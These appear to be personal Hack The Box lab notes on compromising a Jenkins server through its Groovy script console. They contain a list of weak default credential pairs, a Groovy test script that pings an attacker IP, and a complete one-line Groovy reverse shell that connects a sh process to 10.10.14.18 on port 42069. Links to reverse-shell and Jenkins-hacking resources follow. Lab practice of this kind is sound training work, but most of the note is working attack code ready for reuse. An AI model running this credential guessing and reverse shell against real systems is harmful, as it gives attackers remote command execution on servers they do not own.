#hackthebox #lab #reverseshell #groovy 

Common weak creds:
```
admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1
```


Jenkins Groovy scripts:
```groovy
def host = "10.10.14.18"
def command = "ping -c 3 ${host}" 

// Execute command asynchronously
def process = command.execute()
process.waitFor() // Wait for the process to complete

// Check exit value (0 means success)
if (process.exitValue() == 0) {
    println "SUCCESS: ${host} is reachable."
    println process.text // Optional: Print terminal output
} else {
    println "FAILURE: ${host} is unreachable."
}
```
- Test connection

```groovy
String host="10.10.14.18";int port=42069;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
- Connect to reverse shell
- Found here: https://www.revshells.com/ 
- More on jenkins hacking: https://hackviser.com/tactics/pentesting/services/jenkins#script-console-exploitation 
- https://github.com/gquere/pwn_jenkins 